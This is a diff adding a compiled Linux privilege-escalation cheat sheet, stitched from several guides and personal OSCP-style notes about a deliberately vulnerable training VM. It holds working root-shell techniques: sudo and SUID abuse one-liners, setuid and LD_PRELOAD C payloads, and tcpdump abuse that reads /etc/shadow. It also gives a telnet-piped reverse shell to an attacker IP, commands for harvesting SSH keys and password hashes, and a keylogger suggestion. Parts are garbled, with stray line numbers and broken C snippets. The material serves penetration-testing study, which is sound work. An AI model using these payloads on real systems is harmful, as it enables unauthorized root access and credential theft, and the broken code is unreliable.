@@ -1,0 +1,3351 @@
+<h3>
+  
+Privilege Escalation
+
+Once we have a limited shell it is useful to escalate that shells privileges. This way it will be easier to hide, read and write any files, and persist between reboots.
+
+In this chapter I am going to go over these common Linux privilege escalation techniques:
+
+    Kernel exploits
+    Programs running as root
+    Installed software
+    Weak/reused/plaintext passwords
+    Inside service
+    Suid misconfiguration
+    Abusing sudo-rights
+    World writable scripts invoked by root
+    Bad path configuration
+    Cronjobs
+    Unmounted filesystems
+
+Enumeration scripts
+
+I have used principally three scripts that are used to enumerate a machine. They are some difference between the scripts, but they output a lot of the same. So test them all out and see which one you like best.
+
+LinEnum
+
+https://github.com/rebootuser/LinEnum
+
+Here are the options:
+
+-k Enter keyword
+-e Enter export location
+-t Include thorough (lengthy) tests
+-r Enter report name
+-h Displays this help text
+
+Unix privesc
+
+http://pentestmonkey.net/tools/audit/unix-privesc-check
+Run the script and save the output in a file, and then grep for warning in it.
+
+Linprivchecker.py
+
+https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py
+Privilege Escalation Techniques
+Kernel Exploits
+
+By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we usually need to know to test if a kernel exploit works is the OS, architecture and kernel version.
+
+Check the following:
+
+OS:
+
+Architecture:
+
+Kernel version:
+
+uname -a
+cat /proc/version
+cat /etc/issue
+
+Search for exploits
+
+site:exploit-db.com kernel version
+
+python linprivchecker.py extended
+
+Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the sys.log. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.
+Programs running as root
+
+The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below.
+
+Check which processes are running
+
+# Metasploit
+ps
+
+# Linux
+ps aux
+
+Mysql
+
+If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:
+
+select sys_exec('whoami');
+select sys_eval('whoami');
+
+If neither of those work you can use a User Defined Function/
+User Installed Software
+
+Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.
+
+# Common locations for user installed software
+/usr/local/
+/usr/local/src
+/usr/local/bin
+/opt/
+/home
+/var/
+/usr/src/
+
+# Debian
+dpkg -l
+
+# CentOS, OpenSuse, Fedora, RHEL
+rpm -qa (CentOS / openSUSE )
+
+# OpenBSD, FreeBSD
+pkg_info
+
+Weak/reused/plaintext passwords
+
+    Check file where webserver connect to database (config.php or similar)
+    Check databases for admin passwords that might be reused
+    Check weak passwords
+
+username:username
+username:username1
+username:root
+username:admin
+username:qwerty
+username:password
+
+    Check plaintext password
+
+# Anything interesting the the mail?
+/var/spool/mail
+
+./LinEnum.sh -t -k password
+
+Service only available from inside
+
+It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking "since it is only accessible for the specific user we don't need to spend that much of security".
+
+Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside?
+
+# Linux
+netstat -anlp
+netstat -ano
+
+Suid and Guid Misconfiguration
+
+When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.
+
+For example, these are some programs that can be used to spawn a shell:
+
+nmap
+vim
+less
+more
+
+If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights:
+
+nano
+cp
+mv
+find
+
+Find suid and guid files
+
+#Find SUID
+find / -perm -u=s -type f 2>/dev/null
+
+#Find GUID
+find / -perm -g=s -type f 2>/dev/null
+
+Abusing sudo-rights
+
+If you have a limited shell that has access to some programs using sudo you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to cp you can overwrite /etc/shadow or /etc/sudoers with your own malicious file.
+
+awk
+
+awk 'BEGIN {system("/bin/bash")}'
+
+bash
+
+cp
+Copy and overwrite /etc/shadow
+
+find
+
+sudo find / -exec bash -i \;
+
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
+
+ht
+
+The text/binary-editor HT.
+
+less
+
+From less you can go into vi, and then into a shell.
+
+sudo less /etc/shadow
+v
+:shell
+
+more
+
+You need to run more on a file that is bigger than your screen.
+
+sudo more /home/pelle/myfile
+!/bin/bash
+
+mv
+
+Overwrite /etc/shadow or /etc/sudoers
+
+man
+
+nano
+
+nc
+
+nmap
+
+python/perl/ruby/lua/etc
+
+sudo perl
+exec "/bin/bash";
+ctr-d
+
+sudo python
+import os
+os.system("/bin/bash")
+
+sh
+
+tcpdump
+
+echo $'id\ncat /etc/shadow' > /tmp/.test
+chmod +x /tmp/.test
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+vi/vim
+
+Can be abused like this:
+
+sudo vi
+:shell
+
+:set shell=/bin/bash:shell    
+:!bash
+
+How I got root with sudo/
+World writable scripts invoked as root
+
+If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts.
+
+#World writable files directories
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
+
+# World executable folder
+find / -perm -o x -type d 2>/dev/null
+
+# World writable and executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+
+Bad path configuration
+
+Putting . in the path
+If you put a dot in your path you won't have to write ./binary to be able to execute it. You will be able to execute any script or binary that is in the current directory.
+
+Why do people/sysadmins do this? Because they are lazy and won't want to write ./.
+
+This explains it
+https://hackmag.com/security/reach-the-root/
+And here
+http://www.dankalia.com/tutor/01005/0100501004.htm
+Cronjob
+
+With privileges running script that are editable for other users.
+
+Look for anything that is owned by privileged user but writable for you:
+
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+
+Unmounted filesystems
+
+Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.
+
+mount -l
+cat /etc/fstab
+
+NFS Share
+
+If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.
+
+# First check if the target machine has any NFS shares
+showmount -e 192.168.1.101
+
+# If it does, then mount it to you filesystem
+mount 192.168.1.101:/ /tmp/
+
+If that succeeds then you can go to /tmp/share. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.
+
+If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.
+
+This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:
+
+chmod 4777 exploit
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main()
+{
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+
+Steal password through a keylogger
+
+If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.
+Other useful stuff related to privesc
+
+World writable directories
+
+/tmp
+/var/tmp
+/dev/shm
+/var/spool/vbox
+/var/spool/samba
+
+References
+
+http://www.rebootuser.com/?p=1758
+
+http://netsec.ws/?p=309
+
+https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/
+
+Watch this video!
+http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams
+
+http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections
+
+https://www.rebootuser.com/?page_id=1721
+
+Basic Linux Privilege Escalation
+
+Before starting, I would like to point out - I'm no expert. As far as I know, there isn't a "magic" answer, in this huge area. This is simply my finding, typed up, to be shared (my starting point). Below is a mixture of commands to do the same thing, to look at things in a different place or just a different light. I know there more "things" to look for. It's just a basic & rough guide. Not every command will work for each system as Linux varies so much. "It" will not jump off the screen - you've to hunt for that "little thing" as "the devil is in the detail".
+Enumeration is the key.
+
+(Linux) privilege escalation is all about:
+
+    Collect - Enumeration, more enumeration and some more enumeration.
+    Process - Sort through data, analyse and prioritisation.
+    Search - Know what to search for and where to find the exploit code.
+    Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
+    Try - Get ready for (lots of) trial and error.
+
+Operating System
+What's the distribution type? What version?
+
+1
+2
+3
+4
+
+	
+
+cat /etc/issue
+cat /etc/*-release
+  cat /etc/lsb-release      # Debian based
+  cat /etc/redhat-release   # Redhat based
+
+What's the kernel version? Is it 64-bit?
+
+1
+2
+3
+4
+5
+6
+
+	
+
+cat /proc/version
+uname -a
+uname -mrs
+rpm -q kernel
+dmesg | grep Linux
+ls /boot | grep vmlinuz-
+
+What can be learnt from the environmental variables?
+
+1
+2
+3
+4
+5
+6
+7
+
+	
+
+cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+
+Is there a printer?
+
+1
+
+	
+
+lpstat -a
+
+Applications & Services
+What services are running? Which service has which user privilege?
+
+1
+2
+3
+4
+
+	
+
+ps aux
+ps -ef
+top
+cat /etc/services
+
+Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+
+1
+2
+
+	
+
+ps aux | grep root
+ps -ef | grep root
+
+What applications are installed? What version are they? Are they currently running?
+
+1
+2
+3
+4
+5
+6
+
+	
+
+ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+rpm -qa
+ls -alh /var/cache/apt/archivesO
+ls -alh /var/cache/yum/
+
+Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+
+	
+
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+
+What jobs are scheduled?
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+
+	
+
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+
+Any plain text usernames and/or passwords?
+
+1
+2
+3
+4
+
+	
+
+grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 "password" [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+
+Communications & Networking
+What NIC(s) does the system have? Is it connected to another network?
+
+1
+2
+3
+
+	
+
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network
+
+What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
+
+1
+2
+3
+4
+5
+6
+
+	
+
+cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname
+
+What other users & hosts are communicating with the system?
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+
+	
+
+lsof -i
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+
+Whats cached? IP and/or MAC addresses
+
+1
+2
+3
+
+	
+
+arp -e
+route
+/sbin/route -nee
+
+Is packet sniffing possible? What can be seen? Listen to live traffic
+
+1
+
+	
+
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
+
+Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
+Have you got a shell? Can you interact with the system?
+
+1
+2
+3
+
+	
+
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+
+Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+Is port forwarding possible? Redirect and interact with traffic from another view
+
+Note: http://www.boutell.com/rinetd/
+
+Note: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
+
+Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip
+
+Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
+
+1
+
+	
+
+FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+
+Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
+
+1
+2
+
+	
+
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+
+Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
+
+1
+2
+3
+
+	
+
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+
+Is tunnelling possible? Send commands locally, remotely
+
+1
+2
+
+	
+
+ssh -D 127.0.0.1:9050 -N [username]@[ip]
+proxychains ifconfig
+
+Confidential Information & Users
+Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+	
+
+id
+who
+w
+last
+cat /etc/passwd | cut -d: -f1    # List of users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+cat /etc/sudoers
+sudo -l
+
+What sensitive files can be found?
+
+1
+2
+3
+4
+
+	
+
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+
+Anything "interesting" in the home directorie(s)? If it's possible to access
+
+1
+2
+
+	
+
+ls -ahlR /root/
+ls -ahlR /home/
+
+Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
+
+1
+2
+3
+
+	
+
+cat /var/apache2/config.inc
+cat /var/lib/mysql/mysql/user.MYD
+cat /root/anaconda-ks.cfg
+
+What has the user being doing? Is there any password in plain text? What have they been edting?
+
+1
+2
+3
+4
+5
+
+	
+
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+
+What user information can be found?
+
+1
+2
+3
+4
+
+	
+
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+
+Can private-key information be found?
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+
+	
+
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+
+File Systems
+Which configuration files can be written in /etc/? Able to reconfigure a service?
+
+1
+2
+3
+4
+5
+6
+7
+
+	
+
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
+
+find /etc/ -readable -type f 2>/dev/null               # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+
+What can be found in /var/ ?
+
+1
+2
+3
+4
+5
+6
+7
+
+	
+
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+
+Any settings/files (hidden) on website? Any settings file with database information?
+
+1
+2
+3
+4
+5
+
+	
+
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+
+Is there anything in the log file(s) (Could help with "Local File Includes"!)
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+
+	
+
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
+
+Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+
+Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
+If commands are limited, you break out of the "jail" shell?
+
+1
+2
+3
+
+	
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+
+How are file-systems mounted?
+
+1
+2
+
+	
+
+mount
+df -h
+
+Are there any unmounted file-systems?
+
+1
+
+	
+
+cat /etc/fstab
+
+What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+	
+
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
+
+1
+2
+3
+4
+5
+6
+7
+
+	
+
+find / -writable -type d 2>/dev/null      # world-writeable folders
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+
+find / -perm -o x -type d 2>/dev/null     # world-executable folders
+
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+Any "problem" files? Word-writeable, "nobody" files
+
+1
+2
+
+	
+
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
+Preparation & Finding Exploit Code
+What development tools/languages are installed/supported?
+
+1
+2
+3
+4
+
+	
+
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+
+How can files be uploaded?
+
+1
+2
+3
+4
+5
+
+	
+
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+
+Finding exploit code
+
+http://www.exploit-db.com
+
+http://1337day.com
+
+http://www.securiteam.com
+
+http://www.securityfocus.com
+
+http://www.exploitsearch.net
+
+http://metasploit.com/modules/
+
+http://securityreason.com
+
+http://seclists.org/fulldisclosure/
+
+http://www.google.com
+Finding more information regarding the exploit
+
+http://www.cvedetails.com
+
+http://packetstormsecurity.org/files/cve/[CVE]
+
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
+
+http://www.vulnview.com/cve-details.php?cvename=[CVE]
+(Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk
+
+http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/
+
+http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
+Mitigations
+Is any of the above information easy to find?
+
+Try doing it! Setup a cron job which automates script(s) and/or 3rd party products
+Is the system fully patched?
+
+Kernel, operating system, all applications, their plugins and web services
+
+1
+2
+
+	
+
+apt-get update && apt-get upgrade
+yum update
+
+Are services running with the minimum level of privileges required?
+
+For example, do you need to run MySQL as root?
+Scripts Can any of this be automated?!
+
+http://pentestmonkey.net/tools/unix-privesc-check/
+
+http://labs.portcullis.co.uk/application/enum4linux/
+
+http://bastille-linux.sourceforge.net
+Other (quick) guides & Links
+Enumeration
+
+http://www.0daysecurity.com/penetration-testing/enumeration.html
+
+http://www.microloft.co.uk/hacking/hacking3.htm
+Misc
+
+http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf
+
+http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf
+
+http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
+
+Posted by g0tmi1kAug 2nd, 2011 12:00 am bypassing, commands, privilege escalation becareful that the incedent that is going to be reported
+
+open 2 shells
+
+see /etc/passwd for read or write permision (if you have the writable permission replace 'x' with the hash using cmd "mkpasswd -m sha512 (enter your password here)") if you are able to append the file then add a new user with the id of root 0:0
+
+see /etc/shadow for read or write permision (note it uses mostly sha512 you can crack it using john)(if you have the writable permission replace the hash using cmd "mkpasswd -m sha512 (enter your password here)")
+
+use LinEnum save the data
+
+use Linux Smart Enumeration save the data
+
+use Linux privchecker save the data
+
+use BeRoot save the data
+
+the following command will get the programs that are running as root
+
+	"$ ps aux | grep "^root""
+
+	this command will show the version of the following program
+
+	' <program> -v (or) --version' ,  you can also use cmd 'dpkg -l 'in debian and in rpm use rpm and pacman apt etc
+
+
+use unix privese check save the data
+
+suid and sgid enum
+	
+	->use the folloing cmd to find all files "find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null"
+	->exploit them using https://gtfobins.github.io/ 
+	->if any program has exploit just run it and get root shell use google searchsploit etc...
+	->exicute this cmd if any windows new line charactor is present 'sed -i -e "s/^M//" <program wich has windows new line cractor>'
+	->use this command to look the non existing file wich we can run cmd= $ strace <full path ofthe program> 2>&1 | grep -iE "open| access | no such file" 
+	->take any one of the file and then replace with this code
+		
+		#include <stdio.h>
+		#include <stdlib.h>
+		static void inject() __attribute__ ((constructor)):
+		void inject(){
+			setuid(0);
+			system("/bin/bash -p);
+		}
+
+	->save this file as the name of the missing file and then compile it by 
+	->cmd $ gcc -shared -fPIC -o <filename>.so <filename>.c
+ 	->now run the program
+	
+	(OR)
+
+	->run strings command on the following exicutaable binanrylike this 	
+		$ strings /path/to/file;strace -v -f -e execve <path of the program> 2>&1 | grep <part of thecommand eg in 'service start apache2' put only 'service'>
+	->see if any direct command is used if s you can replace it or create a c program of the same command name and change the "PATH=. " and side by side run the program 
+	
+	(OR)
+
+	->run strings command on the following exicutaable binanrylike this 	
+	$ strings /path/to/file;strace -v -f -e execve <path of the program> 2>&1 | grep <part of thecommand eg in 'service start apache2' put only 'service'>
+	->create a fuction named the command in the current dir
+	eg if run program exist in /etc/run then create a function called /etc/run
+	cmd= $ function /etc/run { /bin/bash -p }
+	then cmd = $ export -f /etc/run
+	now run the the program again
+
+	-> if the current sh is lower than 4.4 we can use thiscmd to hyjack and run our commands
+	->env -i SHELLOPTS=xtrace PS4=<UR COMMAND> <full path of your program>
+use mthbernarels == rsg save the data
+
+use default credentials
+
+modify the cron job and hack
+
+	locatios of tabs
+		
+		->/var/spool/cron
+		->/var/spool/cron/crontabs 
+		->/etc/crontabs
+
+do  ls -la * in root directory to view all files and then look for unique file
+
+check for sudo privilage and suid suig and see https://gtfobins.github.io/ 
+
+see /etc/group (by default,a user's primary group has the same name
+
+see the program that is runing as root and try to exploit use cmd "ps aux | grep "^root"
+	->try ot find the version of the program using cmd "<program name> -v (or) --version"
+	->if it is debian also use "dpkg -l | grep <program"
+	->some os use "rpm -qa | grep <program>"
+
+in some programs the root shell will be running in loopback network so you can just port forward and then using ssh you can access it 
+	->client side cmd "ssh -R <local-port>:127.0.0.1:<service port> <username>@<our machine ip add> "
+	eg "ssh -R 4444(outport):127.0.0.1:3306(port where the service is runing) root@1.1.1.1(our ip add)"
+	->attacker machine (us) cmd "<program name> -u root -h 127.0.0.1 -P (port where we can find)"
+	eg mysql -u root -h 127.0.0.1 - 4444 
+
+if sudo is enable then check  gtfobins  (https://gtfobins.github.io/) or for the ld preload and ld library path
+	this is a shared object attack so you can do this https://www.youtube.com/watch?v=e9PmXlG0pyA
+
+	->first create a file and copy the c program
+		
+			for ld preload and save this file as shell.c
+
+				#include <stdio.h>
+				#include <sys/types.h>
+				#include <stdlib.h>
+				void _init() {
+				unsetenv("LD_PRELOAD");
+				setgid(0);
+				setuid(0);
+				system("/bin/sh");
+				}
+
+			then run this commands
+			
+			->gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+			->ls -al shell.so
+			->sudo LD_PRELOAD=/tmp/shell.so <program which i can run as sudo>
+			->id
+			->whoami
+
+	->for ld library path you have to find the programs shared modules using this cmd  "ldd <full path of the program"
+
+		then replace any shared object shown with the same name using this progam compiled file
+			
+			for ld library path save it as the shared object to be replaced
+				
+				#include <stdio.h>
+				#include <sys/types.h>
+				#include <stdlib.h>
+				void _init() {
+				unsetenv("LD_LIBRARY_PATH");
+				setgid(0);
+				setuid(0);	
+				system("/bin/sh");
+				}
+
+			->gcc -fPIC -shared -o <name it as the shared object to be replaced>.so <name it as the shared object to be replaced>.c -nostartfiles
+			->ls -al <name it as the shared object to be replaced>.so
+			->sudo LD_PRELOAD=/tmp/<name it as the shared object to be replaced>.so <program which i can run as sudo>
+			->id
+			->whoami
+
+Are there any hashes in /etc/passwd? If so, can they be cracked quickly? (JtR, HashCat)
+
+Is /etc/shadow readable? If so, are the hashes easily crackable?
+
+Is /etc/passwd or /etc/shadow writeable?
+
+Any passwords in configuration or other files? Is the root password one of those?
+
+Does the current user have sudo rights at all? If so, how can they be abused?
+
+Check /home, /root, /etc/ssh for readable private ssh keys.
+
+Check /home, /root, /etc/ssh for writeable public ssh keys. (authorized_keys) . If not, can an authorized_keys file be created for another user?
+
+Kernel exploits?
+
+Check for SUID/SGID files that may give you read/write/execute access to sensitive files.
+
+Vulnerable/exploitable SUID/SGID executables.
+
+Vulnerable/exploitable files with special capabilities. (This is detailed here)
+
+Vulnerable/exploitable services running as another user/root, or that allow shell commands or other system access? (VNC as root for example)
+
+Are shell rc files (.bashrc, .zshrc, .profile, etc.) writeable? If so, malicious commands can be added to that file, will run when the user/root logs in.
+
+Writeable cron jobs, or other executables/scripts that are run by root.
+
+Replaceable/writeable modules/libraries that are used by privileged executables/scripts/processes.
+
+Writeable configuration files (*.conf) that are used by privileges executables/scripts/processes.
+
+Are there any interesting files in /var/mail/ or /home/*/? Any passwords or useful info in /home/*/.bash_history?
+
+
+look for the backup files and read them
+	->look here
+		/
+		/temp
+		/tmp
+		/var/backups
+		/home
+		/.ssh
+
+This course will be using the Debian VM from the following workshop: https://github.com/sagishahar/lpeworkshop
+The Debian VM has been intentionally misconfigured with numerous privilege escalation methods.
+The “user” account password is: password321 The “root” account password is: password123
+If for some reason you need to use the original VM, or perhaps you already have it set up, I have created a Bash script which integrates a few more misconfigurations into the VM: https://github.com/Tib3rius/privesc-setup
+Log onto the VM as the root user (root/password123) and run the script.
+This course was designed with the OSCP labs and exam in mind, however it attempts to cover a wide range of escalation techniques beyond what an OSCP student is expected to understand.
+Understanding that privilege escalation is often highly complex, and new techniques are developed over time, this course is not intended to be a “complete” guide to every privilege escalation technique.
+When appropriate, the author will update the course materials to include new techniques which are considered to be valuable.
+creating the Debian VM and privilege escalation workshop, and licensing it such that it could be used in this course.
